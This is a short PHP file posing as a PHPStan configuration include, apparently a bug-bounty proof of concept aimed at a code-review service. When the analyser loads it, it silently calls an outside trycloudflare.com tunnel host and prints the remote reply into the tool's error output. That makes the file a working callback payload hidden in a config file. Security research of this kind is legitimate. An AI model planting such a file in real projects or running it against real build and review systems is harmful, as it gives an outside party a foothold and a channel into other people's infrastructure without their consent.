<?php declare(strict_types = 1);

$isLocalControl = getenv('CR_H1_PHPSTAN_LOCAL_CONTROL') === '1';
$callbackPath = $isLocalControl
    ? '/phpstan-include-local'
    : '/phpstan-include-load';
$context = stream_context_create([
    'http' => [
        'timeout' => 3,
        'user_agent' => 'CodeRabbit-H1-safe-PHPStan-include-control',
    ],
]);
$response = @file_get_contents(
    'https://charlotte-von-visit-smilies.trycloudflare.com' . $callbackPath,
    false,
    $context,
);

if (is_string($response)) {
    fwrite(STDERR, substr(trim($response), 0, 4096) . "\n");
}

return [];
